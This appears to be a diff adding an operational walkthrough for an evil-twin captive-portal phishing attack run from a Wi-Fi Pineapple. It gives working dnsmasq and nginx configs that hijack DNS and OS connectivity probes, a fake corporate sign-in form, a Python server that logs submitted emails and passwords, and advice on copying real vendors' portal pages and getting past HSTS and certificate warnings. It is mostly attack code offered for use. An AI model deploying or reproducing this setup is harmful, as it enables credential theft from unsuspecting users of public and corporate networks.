@@ -1,0 +1,155 @@
+# Captive portal — walkthrough
+
+Stand up the four-layer chain (DHCP → DNS → HTTP → form) on the
+Pineapple. Template it to the target vendor. Capture the POST.
+
+## Preconditions
+
+- Open (no WPA) or WPA2-PSK-with-known-PSK rogue AP already up.
+  See `evil-twin/walkthrough.md`.
+- Root SSH on the Pineapple.
+
+## Step 1 — dnsmasq: DHCP + DNS
+
+```
+cat > /etc/dnsmasq.captive.conf <<EOF
+interface=wlan1
+bind-interfaces
+dhcp-range=172.16.42.10,172.16.42.250,255.255.255.0,12h
+dhcp-option=3,172.16.42.1               # gateway = us
+dhcp-option=6,172.16.42.1               # DNS = us
+
+# Every A record resolves to us.
+address=/#/172.16.42.1
+
+# Return a captive-portal API for OSes that ping known probe URLs.
+address=/captive.apple.com/172.16.42.1
+address=/connectivitycheck.gstatic.com/172.16.42.1
+address=/detectportal.firefox.com/172.16.42.1
+address=/www.msftconnecttest.com/172.16.42.1
+EOF
+
+pkill dnsmasq
+dnsmasq -C /etc/dnsmasq.captive.conf
+```
+
+## Step 2 — nginx or a Python one-liner for HTTP
+
+Minimum viable — every URL redirects to the login form:
+
+```
+# /etc/nginx/sites-enabled/captive
+server {
+    listen 80 default_server;
+    server_name _;
+
+    location / {
+        return 302 http://172.16.42.1/login;
+    }
+
+    location /login {
+        root /var/www/captive;
+        index index.html;
+    }
+
+    location /submit {
+        proxy_pass http://127.0.0.1:8000/submit;
+    }
+
+    # OS probe URLs — return the "not captive" 204 to a wrong host on purpose:
+    # Do NOT return 204 here; return the login page so the OS surfaces the
+    # captive portal banner.
+    location /generate_204 { return 302 http://172.16.42.1/login; }
+    location /hotspot-detect.html { return 302 http://172.16.42.1/login; }
+    location /connecttest.txt { return 302 http://172.16.42.1/login; }
+}
+```
+
+Login form (`/var/www/captive/index.html`):
+
+```html
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>WiFi Sign-in</title>
+</head>
+<body style="font-family:sans-serif;padding:2em;">
+  <h1>CorpWiFi — Sign in to continue</h1>
+  <form method="POST" action="/submit">
+    <p><label>Email <input name="email"></label></p>
+    <p><label>Password <input name="password" type="password"></label></p>
+    <button type="submit">Connect</button>
+  </form>
+</body>
+</html>
+```
+
+## Step 3 — Credential logger
+
+```python
+# /opt/portal-logger.py — port 8000
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
+import time, json, os
+
+LOG = "/tmp/portal-creds.jsonl"
+
+class H(BaseHTTPRequestHandler):
+    def do_POST(self):
+        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
+        params = parse_qs(body.decode("utf-8", errors="replace"))
+        entry = {
+            "ts": time.time(),
+            "peer": self.client_address[0],
+            "ua": self.headers.get("User-Agent", ""),
+            "form": {k: v[0] for k, v in params.items()},
+        }
+        with open(LOG, "a") as f:
+            f.write(json.dumps(entry) + "\n")
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html")
+        self.end_headers()
+        self.wfile.write(b"<h1>Connecting...</h1>")
+
+HTTPServer(("127.0.0.1", 8000), H).serve_forever()
+```
+
+Run it: `python3 /opt/portal-logger.py &`
+
+## Step 4 — Templating for the target vendor
+
+Match the target's branding — logo, color, "sign in" wording. Real
+users are calibrated to visual details; a Comic Sans "Enter Password"
+against a black background fools nobody.
+
+- **eaphammer** ships templates for Xfinity, T-Mobile, hotel-brand,
+  Starbucks. `eaphammer --templates-list`.
+- **wifipumpkin3** has a plugin ecosystem for more.
+- Copy the real vendor's HTML from a legitimate capture (curl the
+  real portal, save the response, edit the form action).
+
+## Step 5 — Read captured creds
+
+```
+tail -F /tmp/portal-creds.jsonl | jq
+```
+
+## Failure modes
+
+- **Client OS shows "captive portal" but user ignores it.** Cheap OS
+  banners are less compelling than the URL bar. Some Android builds
+  auto-open the captive URL in a system webview — that's your friend.
+- **HSTS blocks HTTP form.** Serve HTTPS with a self-signed cert.
+  Most captive-portal contexts pre-associate HSTS as "trusted" once
+  the user clicks through; on iOS this is invisible because the
+  captive UI hides browser chrome.
+- **User sees the cert warning and bails.** Real risk on modern iOS/
+  Android. Templates that mimic Wi-Fi Alliance / Passpoint captive
+  pages are less flag-raising than a fake "Google login."
+
+## Cite
+
+- IETF RFC 8908 — Captive Portal API (modern OS probe URLs).
+- Hak5 evil-portal module docs.
+- attacks.json: `captive-portal-cred-capture`.
